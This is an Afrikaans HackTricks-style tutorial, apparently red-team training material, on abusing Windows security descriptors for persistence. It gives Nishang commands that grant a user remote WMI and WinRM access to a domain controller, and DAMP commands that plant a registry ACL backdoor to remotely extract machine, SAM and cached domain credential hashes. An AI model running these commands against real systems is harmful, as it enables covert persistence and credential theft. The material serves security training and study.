# Sekuriteitsbeskrywers

{{#include ../../banners/hacktricks-training.md}}

## Sekuriteitsbeskrywers

Windows-sekuriteitsbeskrywers bevat ’n eienaar-SID, ’n primêre-groep-SID, ’n diskresionêre ACL (DACL) wat toegang beheer, en ’n stelsel-ACL (SACL) wat hoofsaaklik vir ouditering gebruik word. Security Descriptor Definition Language (SDDL) is die tekstuele voorstelling; ’n ACE-string het die vorm `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

’n Sekuriteitsbeskrywer stoor wie ’n beveiligbare objek besit en watter principals spesifieke regte daaroor toegelaat of geweier word. As ’n aanvaller ’n DACL kan verander, kan hulle ’n principal met lae voorregte regte gee wat normaalweg ’n administratiewe rol vereis.

Dit maak noukeurig gewysigde beskrywers nuttig vir persistence: die rekening bly buite ooglopende bevoorregte groepe terwyl dit toegang tot ’n spesifieke bestuursvlak behou. Bewaar die oorspronklike beskrywer voordat jy toets sodat die verandering presies verwyder kan word.

### Toegang tot WMI

Jy kan ’n gebruiker toegang gee om **WMI op afstand uit te voer** [**met behulp hiervan**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Toegang tot WinRM

Gee ’n gebruiker toegang tot ’n afgeleë PowerShell/WinRM-eindpunt met Nishang se `Set-RemotePSRemoting`-funksie:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Afgeleë toegang tot hashes

DAMP kan ’n registry-ACL-backdoor skep wat later afgeleë herwinning van die masjienrekening-hash, plaaslike SAM-hashes en gekaste domeinbewyse toelaat. Deur hierdie beperkte regte aan ’n andersins gewone rekening toe te ken—veral teenoor ’n domeinbeheerder—word kragtige persistence verskaf sonder lidmaatskap van ’n bevoorregte groep.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Kyk na [**Silver Tickets**](silver-ticket.md) om te leer hoe jy die hash van die rekenaarrekening van 'n Domain Controller kan gebruik.

## References

- [1] [Sekuriteitsbeskrywing-definisietaal - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Diskresionêre ACL-wysigingsprojek](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Sekuriteitsbeskrywing-stringformaat](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
